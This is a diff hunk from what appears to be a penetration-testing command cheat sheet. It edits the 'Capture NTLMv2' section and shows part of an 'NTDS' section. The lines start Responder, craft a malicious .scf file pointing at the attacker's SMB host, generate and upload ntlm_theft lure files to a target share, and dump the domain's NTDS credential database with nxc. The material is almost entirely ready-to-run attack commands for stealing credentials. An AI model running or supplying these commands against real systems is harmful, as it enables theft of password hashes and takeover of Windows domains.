@@ -855,8 +855,9 @@ mkdir smb; smbclient //$TARGET/SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb
 
 +---------- Capture NTLMv2 ----------+
 sudo responder -I tun0 -v
+ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/SHARENAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd file; recurse; prompt; mput *'
 echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\responder\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
-ntlm_theft.py --generate all $MYIP -f file; smbclient //$TARGET/SHARENAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd file; recurse; prompt; mput *'
+
 
 +---------- NTDS ----------+
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
